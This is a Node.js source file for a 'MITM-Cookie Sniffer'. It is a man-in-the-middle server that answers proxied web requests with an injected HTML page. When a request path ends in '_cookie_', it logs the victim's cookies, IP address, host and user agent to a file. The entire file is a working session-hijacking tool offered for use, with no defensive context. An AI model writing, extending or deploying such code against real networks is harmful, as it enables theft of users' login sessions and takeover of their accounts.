/**
 * MITM-Cookie Sniffer
 *   @version 0.0.1
 *   @author EtherDream
 */
'use strict';

var $http = require('http'),
    $fs = require('fs');

var LOG_FILE = 'log.txt';

// frontend page
var mPage = $fs.readFileSync('inject.html');

// backend filter
var POSTFIX = /_cookie_$/;



init(8080);

function init(port) {
    var svr = $http.createServer(onRequest);

    svr.listen(port, function() {
        console.log('running...');
    });

    svr.on('error', function() {
        console.error('listen fail');
    });
}

function fail(res) {
    res.writeHead(404);
    res.end();
}


var R_URL = /^http:\/\/[^/]*(.*)/i;


function onRequest(req, res) {
    // GET http://... (Forward Proxy)
    var m = req.url.match(R_URL);
    if (m) {
        req.url = m[1];
    }

    if (POSTFIX.test(req.url)) {
        // cookie request
        var headers = req.headers;
        var cookie = headers['cookie'];
        if (cookie) {
            var ip = req.connection.remoteAddress;
            var path = headers['host'] + req.url.split('?')[0];

            var info = ip + '\t' + path;
            console.log(info);

            // log to file
            $fs.appendFileSync(LOG_FILE, info + '\n' + headers['user-agent'] + '\n' + cookie + '\n');
        }

        res.writeHead(200, {
            'Cache-Control': 'no-cache',
            'Content-Type': 'text/javascript'
        });
        res.end();
    }
    else {
        // otherwise: response page
        res.writeHead(200, {
            'Content-Type': 'text/html',
            'Content-Length': mPage.length
        });
        res.end(mPage);
    }
}
